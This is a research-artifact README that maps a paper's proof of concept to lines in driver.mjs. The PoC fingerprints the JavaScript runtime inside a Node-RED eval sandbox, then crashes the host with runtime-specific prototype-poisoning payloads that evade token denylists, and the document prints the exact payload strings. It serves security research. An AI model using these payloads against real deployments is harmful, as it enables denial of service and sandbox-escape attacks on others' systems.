# Finding the PoC in `driver.mjs`

A pointer map from the paper's two claims — **(1) fingerprint the runtime, (2)
detonate a runtime-targeted, token-clean payload** — to the exact lines of
[`driver.mjs`](driver.mjs) that implement them. The fingerprint is the paper's
**Fig. 7** (`fig:minimal_poc_nodered`). Line numbers are stable as of this commit;
the anchor strings in **bold** are grep-able if they drift.

## Submission surface (the flow the attacker deploys)

- **`driver.mjs:39`** — `const FLOW` — the flow deployed via `POST /flows`:
  `http in(/run) → function(eval) → http response`.
- **`driver.mjs:43`** — the function node's `func:` — `eval(code)` of whatever the
  attacker sends to `POST /run {code}`. This is the sandbox the rest attacks.

## Claim 1 — the fingerprint (Stage 1, paper Fig. 7)

Benign JavaScript; identifies the runtime from sandbox output alone. Two signals:

- a **CallSite-constructor probe** — `Error.prepareStackTrace` is swapped in so
  `Error().stack[0]` is a V8 CallSite; `new C(C,6).toString()` on its constructor
  **throws on Node** but succeeds on Deno/Bun → `callsite=false` ⇒ **Node**.
- an **Intl/ICU** signal — `Intl.NumberFormat([], {style:'currency', currency:'AFN'})`
  `.resolvedOptions().minimumFractionDigits` is **2 on Bun**, **0 on Deno/Node**.

Decision: `!callsite ? 'node' : (afn === 2 ? 'bun' : 'deno')`.

- **`driver.mjs:51`** — `const FP_RT` — the one-line fingerprint expression
  (returns `'node'|'deno'|'bun'`), reused to gate the Deno payload (below).
- **`driver.mjs:56`** — `const PROBE` — the probe eval'd in the sandbox. Its `intro`
  block shows introspection is *denied* (`typeof process/Deno/Bun` are `undefined`,
  `Function('return process')()` throws); its `fp` block runs the Fig. 7 fingerprint
  and returns the raw signals (`callsite`, `afn`) plus the decided `rt`.
- **`driver.mjs:67`** — `const infer` — the decision, from the raw signals:
  `!callsite ? node : (afn===2 ? bun : deno)`.
- **`driver.mjs:118`** — the Stage-1 loop; the call at **`driver.mjs:122`**
  (`infer(p?.fp)`) is where the guess is made and scored.

## Claim 2 — the payload (Stage 2)

Process-free detonation: poison a **host** intrinsic through `msg`, with none of the
tokens a code-injection denylist looks for.

- **`driver.mjs:69`** — the block comment explaining *why* it works:
  `Object.getPrototypeOf(msg)` **is** the host realm's `Object.prototype` (because
  `msg` is a host object), so `defineProperty` on it hits host intrinsics with no
  realm crossing.
- **`driver.mjs:76`** — `const POISON` — the payload builder:
  `Object.defineProperty(Object.getPrototypeOf(msg), <name>, <desc>)`. No
  `process` / `require` / `constructor` / `Function` / `eval` anywhere.
- **`driver.mjs:77`** — `const PAYLOADS` — the three runtime-targeted payloads:
  - **`driver.mjs:78`** — **node** → poison `chunkedEncoding` (*intrinsic*: Node's
    native `http` writes it).
  - **`driver.mjs:81`** — **bun** → poison `headers` (*intrinsic*: Bun's `http`
    reads it on a plain object).
  - **`driver.mjs:84`** — **deno** → `if (<FP_RT> === 'deno') { poison _readableState }`
    (*fingerprint-gated*: no Deno-only intrinsic crash exists, so it arms only on
    Deno and is a no-op elsewhere).
- **`driver.mjs:132`** — the Stage-2 loop building the 3×3 payload×deployment
  matrix; **`driver.mjs:137`** (`waitDown`) is the DOWN/UP health check via
  `GET /settings`.

## The exact strings submitted to the victim

```
fingerprint (Fig. 7):  a CallSite-constructor probe + Intl/ICU AFN currency digits,
                       decided as  !callsite ? 'node' : (afn === 2 ? 'bun' : 'deno')

node:  Object.defineProperty(Object.getPrototypeOf(msg),"chunkedEncoding",{get(){throw new Error('ce')},configurable:true})
bun:   Object.defineProperty(Object.getPrototypeOf(msg),"headers",{get(){throw new Error('hp')},configurable:true})
deno:  if (<fingerprint> === 'deno') { Object.defineProperty(Object.getPrototypeOf(msg),"_readableState",{get(){throw new Error('rs')},configurable:true}) }
```

The **poison gadget** (each `Object.defineProperty(...)` above) is grep-clean of
`process | require | constructor | Function | eval | __proto__` — matching the
paper's Fig. 7 "token-clean getter". Note the **deno** string also carries the
fingerprint *gate*, which — like the paper's Fig. 7 stage 1 — reads
`Error().stack[0].constructor` (a benign property access), so that combined string
does contain the substring `constructor`; the detonation gadget itself does not.

## Provenance

The fingerprint here matches the paper's **Fig. 7** (CallSite constructor + Intl/ICU
AFN), *not* the older `../fingerprint-poc/nodered/nr-driver.mjs`, whose stage-1 uses
a different (V8-vs-JavaScriptCore + `typeof Temporal`) probe. The stage-2 detonation
(`getPrototypeOf(msg)` + `chunkedEncoding`/`headers`/`_readableState`) matches both.
